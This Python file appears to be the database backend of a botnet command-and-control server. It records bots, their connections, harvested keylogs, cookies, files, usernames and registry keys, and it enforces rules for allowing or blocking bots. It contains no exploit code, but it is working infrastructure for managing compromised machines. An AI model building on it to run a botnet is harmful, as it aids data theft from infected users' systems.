def insertAntivirus(mac_address,antivirus_detected,connObj):
    # invalid antirivus
    if(antivirus_detected == None):
        return -1
    # mac address exists
    if(getSystemInformation(mac_address)!=None):
        #add antivirus
        for x in getAntiviruses(mac_address):
            #registry already exists
            if x[1] == antivirus_detected:
                return -1
        # registry does not exist, add it
        # sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Antivirus(antivirus_detected=antivirus_detected,connection=connObj)
        obj.save()

# This function will insert a new entry
# into the connection table and associated it 
# with a system information table entry
def insertConnection(bot_id, mac_address, ip_address='xxx.xxx.xxx.xxx', connection_type='NA'):
    # invalid ip_address
    if(ip_address == None or len(mac_address)!=17):
        return -1
    # mac address exists
    if(getSystemInformation(mac_address)!=None):
        # add connection
        sys_info = System_Information.objects.get(mac_address=mac_address)
        bot = Bot_Sample.objects.get(bot_id=bot_id)
        obj = Connection(bot_id= bot , mac_address=sys_info,ip_address=ip_address,connection_type=connection_type)
        obj.save()
        if(ip_address!='xxx.xxx.xxx.xxx'):
            insertIPAddress(ip_address)
        return obj

# This function will determine the location
# of an IP address based on an online API resource
def getLocationFromIP(ip_address):
    import urllib.request
    conn = urllib.request.urlopen("http://ip-api.com/json/"+str(ip_address))
    string = conn.read().decode('utf-8')
    json_obj = json.loads(string)
    return(json_obj['city']+','+json_obj['country'])

# This function will insert a new entry
# into the location table
def insertIPAddress(ip_address=None):
    # invalid location
    if(ip_address == None):
        return -1
    # ip_address exists in connection table
    # loc_obj = Location.objects.filter(ip_address=ip_address)
    connect()
    botinfo.execute("SELECT * FROM database_location WHERE ip_address=? ",(ip_address,))
    loc_obj = botinfo.fetchall()

    if(ip_address!=None and loc_obj == []):
        # add location
        location = getLocationFromIP(ip_address)
        obj = Location(ip_address=ip_address,country=location)
        obj.save()
    disconnect()
    return 0

# This function will insert a new entry
# into the registry table and associate
# it with a connection table entry
def insertRegistry(mac_address,registry,connObj,detected=True):
    # registry is invalid
    if(registry == None):
        return -1
    # mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getRegistries(mac_address):
            # registry already exists
            if str(x[1]) == str(registry):
                return -1
        # registry does not exist, add it
        regObj = AvailableRegistry.objects.get(registry_key=registry.replace("\\\\\\\\","\\\\"))
        # print(Registry.objects.filter(connection=connObj, registry=regObj))
        if(len(Registry.objects.filter(connection=connObj, registry=regObj)) == 0):
            obj = Registry(registry=regObj,connection=connObj,detected=detected)
            obj.save()

# This function will insert a new entry
# into the keylogging table and
# associated it with a connection table entry
def insertKeylogging(mac_address, filename, connObj):
    # filename is invalid
    if(filename == None):
        return -1
    # mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getKeyloggings(mac_address):
            # filename already exists
            if x[1] == str(filename):
                return 0
        # filename does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Keylogging(connection=connObj,filename=filename)
        obj.save()
        return 1

# This function will insert a new entry
# into the cookies table and
# associated it with a connection table entry
def insertCookies(mac_address, timestamp, web_browser, connObj):
    # filename is invalid
    if(timestamp == None):
        return -1
    # mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getCookies(mac_address):
            # filename already exists
            if x[1] == str(timestamp):
                return 0
        # filename does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Cookies(connection=connObj,filename=timestamp,web_browser=web_browser)
        obj.save()
        return 1

# This function will insert a new entry
# into the files table and
# associated it with a connection table entry
def insertFile(mac_address, bot_id, filepath, _file, connObj):
    # filename is invalid
    if(filepath == None):
        return -1
    # mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getFiles(mac_address, bot_id):
            # filename already exists
            if str(x[1]) == str(filepath+"\\\\"+_file):
                return 0
        # filename does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        avail_file_obj = AvailableFiles.objects.filter(file_path=(filepath+"\\\\"+_file))[0]
        obj = Files(connection=connObj,avail_file=avail_file_obj,filename=_file)
        obj.save()
        return 1

# This function will insert a new entry
# into the available files table and
# associated it with a connection table entry
def insertAvailableFile(file_path, file_type, currently_available):
    # filename is invalid
    if(file_path == None):
        return -1
    # file_path does not exist
    if(len(getAvailableFiles(file_path)) == 0):
        avail_file_obj = AvailableFiles(file_path=file_path, file_type=file_type,active=currently_available)
        avail_file_obj.save()
        return 1

# This function will insert a new entry
# into the username table and associate
# it with a connection table entry
def insertUsername(mac_address, username, connObj):
    # username is invalid
    if(username == None):
        return -1
    # mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getUsernames(mac_address):
            # username already exists
            if x[1] == username:
                return -1
        # username does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = User(username=username,connection=connObj)
        obj.save()

# This function will insert a new action
# into the action table
def insertAction(action):
    # action is invalid
    if(action == None):
        return -1
    # action does not exist
    if(len(getAction(action))==0):
        action = Action(action = action, enabled=True)
        action.save()

# This function will increment the count
# for the number of times a bot has connected
# to the botmaster
def botConnectIn(bot_id):
    # bot_id is invalid
    if(bot_id == None):
        return -1
    # increment bot connection count
    if(getBot(bot_id)!=[]):
        bot = Bot_Sample.objects.get(bot_id=bot_id)
        bot.connection_count = bot.connection_count + 1
        bot.save()

# This function will insert a bot_id into
# the bot_sample table
def insertBot(bot_id):
    # bot is valid
    if(bot_id == None):
        return -1
    # action does not exist
    if(len(getBot(bot_id))==0):
        bot = Bot_Sample(bot_id = bot_id, encrypted = False)
        bot.save()

# This function will associate a bot_id
# to an available action by creating a 
# new relationship entry in the bot_action table
def insertBotAction(bot_id, action):
    # bot is valid
    if(bot_id == None or action == None):
        return -1
    # action does not exist
    # print(getBotAction(bot_id, action))
    if(getBotAction(bot_id, action)==None and len(getAction(action))!=0 and len(getBot(bot_id))!=0):
        bot_obj = Bot_Sample.objects.get(bot_id = bot_id)
        action_obj = Action.objects.get(action = action)
        bot_action_obj = Bot_Action(bot_id = bot_obj, action=action_obj,action_count=0, enabled=True)
        bot_action_obj.save()
##################  END INSERT INFORMATION  ##########################

################## START UPDATE INFORMATION ##########################
#Database update query functions which are utilized by the APIs

# This function will update the os
# information in a system_information
# entry
def updateOS(mac_address, op_sys, connObj):
    if(getSystemInformation(mac_address)!=None):
        sys_info = System_Information.objects.get(mac_address=mac_address)
        if(sys_info.op_system == 'None'):
            sys_info.op_system = op_sys
            sys_info.save()

# This function will update the cpu
# information in a systme_information entry
def updateCPU(mac_address, cpu, connObj):
    if(getSystemInformation(mac_address)!=None):
        sys_info = System_Information.objects.get(mac_address=mac_address)
        if(sys_info.cpu == 'None'):
            sys_info.cpu = cpu
            sys_info.save()

# This function will update if a mac_address is
# denied from the system or not
def updateMacConnectionAllowed(mac_address,connection_allowed):
    sys_info = System_Information.objects.get(mac_address=mac_address)
    sys_info.connection_allowed = connection_allowed
    sys_info.save()

# This function will update if a bot_id is 
# denied from the system or not
def updateBotConnectionAllowed(bot_id, connection_allowed):
    bot = Bot_Sample.objects.get(bot_id=bot_id)
    bot.connection_allowed = connection_allowed
    bot.save()

# This fucntion will toggle if a mac_address is
# denied from the system or not
def toggleMacConnectionAllowed(mac_address):
    #toggle connection true/false
    sys_info = System_Information.objects.get(mac_address=mac_address)
    sys_info.connection_allowed = not(sys_info.connection_allowed)
    sys_info.save()

# duplicate?
def updateBotConnectionAllowed(bot_id,connection_allowed):
    #update connection allowed for bot
    bot_info = Bot_Sample.objects.get(bot_id=bot_id)
    bot_info.connection_allowed = connection_allowed
    bot_info.save()

# This function will toggle if a bot_id is 
# denied from the system or not
def toggleBotConnectionAllowed(bot_id):
    bot_info = Bot_Sample.objects.get(bot_id=bot_id)
    bot_info.connection_allowed = not(bot_info.connection_allowed)
    bot_info.save()

# This function will update a bots
# ability to have an encrypted connection
def updateBotEncrypt(bot_id, encrypt=False):
    # bot is valid
    if(bot_id == None):
        return -1
    bot = Bot_Sample.objects.filter(bot_id = bot_id)
    if(len(bot)==1):
        bot = bot[0]
        bot.encrypted = encrypt
        bot.save()
##################  END UPDATE INFORMATION  ##########################

######################## START OTHER #################################
#Other functions are placed here

#Checks if a mac_address meets a certain format
def isMacValid(mac_address):
    if(len(mac_address)!=17):
        return False
    if(mac_address[2]==':' and mac_address[5]==':' and mac_address[8]==':' and mac_address[11]==':' and mac_address[14]==':'):
        return True
    else:
        return False

#Checks if an ip_address meets a certain format
def isIpValid(ip_address):
    reg = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if(reg.match(ip_address)):
        return True
    else:
        return False
######################## END OTHER #################################


def incrementBotAction(bot_id, action_id):
    bot_obj = Bot_Sample.objects.get(bot_id = bot_id)
    action_obj = Action.objects.get(action = action_id)
    botAction = Bot_Action.objects.get(bot_id = bot_obj, action=action_obj)
    botAction.action_count = botAction.action_count + 1
    botAction.save()
    return 0

def disableBotAction(bot_id, action_id):
    bot_obj = Bot_Sample.objects.get(bot_id = bot_id)
    action_obj = Action.objects.get(action = action_id)
    botAction = Bot_Action.objects.get(bot_id = bot_obj, action=action_obj)
    botAction.enabled = not (botAction.enabled)
    botAction.save()
    return 0


################### START CONNECTION RULES ###########################
# This function will update the connection rules in the connection_rules table
def updateConnectionRules():
    global NO_CONNECTIONS_BEFORE, NO_CONNECTIONS_AFTER, MAX_CONNECTIONS_PER_DAY, MAX_CONNECTIONS, ONFAILURE, RESPONSE, ACTION, RULESACTIVE
    if(len(ConnectionRules.objects.all())==1):
        connection_rules = ConnectionRules.objects.all()[0]
        NO_CONNECTIONS_BEFORE = connection_rules.no_connect_before
        NO_CONNECTIONS_AFTER = connection_rules.no_connect_after
        MAX_CONNECTIONS_PER_DAY = connection_rules.max_connections_per_day
        MAX_CONNECTIONS = connection_rules.max_connections
        ONFAILURE = connection_rules.on_failure
        RESPONSE = connection_rules.response
        ACTION = connection_rules.action
        RULESACTIVE = connection_rules.active
    return 0
###################  END CONNECTION RULES  ###########################

############### START CHECK CONNECTION RULES #########################
# This function will check if any of the connection
# rules have been broken or not and respond appropriately
def checkConnectionRules(mac_address, bot_id):
    updateConnectionRules()      # set the above connection rules

    # RULES ARE ACTIVE
    if(RULESACTIVE):
        allowed = True
        hours = int(strftime("%H", gmtime()))
        minutes = int(strftime("%M", gmtime()))
        seconds = int(strftime("%S", gmtime()))
        b_hour = int(str(NO_CONNECTIONS_BEFORE)[0:2])
        b_minute = int(str(NO_CONNECTIONS_BEFORE)[3:5])
        b_seconds = int(str(NO_CONNECTIONS_BEFORE)[6:8])
        a_hour = int(str(NO_CONNECTIONS_AFTER)[0:2])
        a_minute = int(str(NO_CONNECTIONS_AFTER)[3:5])
        a_seconds = int(str(NO_CONNECTIONS_AFTER)[6:8])
        # connection is during the correct hours of the day
        if((b_hour <= hours <= a_hour) and (b_minute <= minutes <= a_minute) and (b_seconds <= seconds <= a_seconds)):
            # check if max_connection count has been passed
            if(getConnectionCount(mac_address) < MAX_CONNECTIONS_PER_DAY or MAX_CONNECTIONS_PER_DAY == -1):
                # check if daily connection count has been passed
                if(getTotalConnectionCount(mac_address) < MAX_CONNECTIONS or MAX_CONNECTIONS == -1):
                    allowed = True
                else:
                    allowed = False
            else:
                allowed = False
        # conncection is no during the correct hours of the day
        else:
            allowed = False

    # RULES ARE NOT ACTIVE
    else:
        return 0

    # connection rules are broken
    if(not allowed):
        # connection is allowed anyway
        if(ONFAILURE == 'Allow'):
            return 0
        else:
            # if broken rule requires an action
            if(ONFAILURE == 'Deny'):
                return -1
            elif(ONFAILURE == 'Deny:Response' or ONFAILURE == 'Deny:Response/Action'):
                if(RESPONSE == 'Nothing'):
                    pass
                elif(RESPONSE == 'Disable:Mac Address'):
                    updateMacConnectionAllowed(mac_address, False)
                elif(RESPONSE == 'Disable:Bot ID'):
                    updateBotConnectionAllowed(bot_id, False)
                elif(RESPONSE == 'Disable:Mac/Bot'):
                    updateMacConnectionAllowed(mac_address, False)
                    updateBotConnectionAllowed(bot_id, False)
            # if broken rule sends an action
            if(ONFAILURE == 'Deny:Action' or ONFAILURE == 'Deny:Response/Action'):
                # no action to return
                if(ACTION == 'Nothing'):
                    return -1
                # return action
                else:
                    return 1

    return 0
################  END CHECK CONNECTION RULES  ########################